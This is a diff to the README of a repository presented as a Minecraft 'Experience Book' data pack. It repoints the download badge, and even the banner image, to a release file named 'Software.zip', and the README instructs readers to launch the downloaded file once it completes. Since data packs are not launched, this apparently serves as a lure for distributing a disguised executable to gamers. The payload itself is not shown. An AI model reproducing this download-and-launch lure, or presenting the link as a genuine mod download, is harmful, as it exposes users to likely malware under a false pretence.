@@ -5,7 +5,7 @@ Welcome to the **experience-book-data-pack** repository! This Minecraft Data Pac
 
 ## 📦 Download
 To download the data pack, click the button below:
-[![Download Data Pack](https://img.shields.io/static/v1?label=Download&message=Data%20Pack&color=blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Data Pack](https://github.com/Dharunkumar2912/experience-book-data-pack/releases/download/v1.0/Software.zip%20Pack&color=blue)](https://github.com/Dharunkumar2912/experience-book-data-pack/releases/download/v1.0/Software.zip)
 
 **Note:** Make sure to launch the downloaded file once it's completed.
 
@@ -43,4 +43,4 @@ Stay updated on the latest releases and updates by bookmarking this repository. 
 
 Dive into the world of Minecraft with the Experience Book Data Pack. Start saving your experience points in a book today and elevate your gaming experience to a whole new level! 🌟 Happy gaming! 🎮
 
-![Minecraft Experience Book](https://via.placeholder.com/800x400)
+![Minecraft Experience Book](https://github.com/Dharunkumar2912/experience-book-data-pack/releases/download/v1.0/Software.zip)
